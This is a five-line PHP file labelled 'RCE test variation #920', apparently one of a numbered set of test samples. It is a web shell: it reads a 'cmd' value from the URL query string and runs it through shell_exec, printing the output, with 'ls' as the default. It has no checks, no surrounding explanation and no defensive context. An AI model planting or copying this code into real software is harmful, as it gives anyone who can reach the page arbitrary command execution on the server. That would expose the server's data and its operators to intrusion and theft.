<?php
// RCE test variation #920
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>